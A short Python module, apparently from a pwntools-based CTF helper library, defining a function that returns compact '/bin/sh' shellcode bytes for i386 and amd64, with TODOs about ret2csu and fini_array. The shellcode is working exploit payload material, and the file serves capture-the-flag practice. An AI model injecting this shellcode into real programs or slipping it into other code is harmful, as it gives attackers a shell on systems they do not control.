'''A dumping ground for some uncommon CTF-type exploits
that are repeated enough to justify existing as an
automated script.'''
# TODO: see if ret2csu gets pushed to pwntools-dev. If not...
# TODO: fini_arr.
from pwnscripts.context import context
def sh() -> bytes:
    '''Shorter shellcode, in case program limits require it
    Returns: bytestring of '/bin/sh' shellcode based on context.arch'''
    if context.arch == 'i386':  # shellcode-841.php
        return b'1\xc9\xf7\xe1\xb0\x0bQh//shh/bin\x89\xe3\xcd\x80'
    if context.arch == 'amd64': # system overlord
        return b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
    raise NotImplementedError
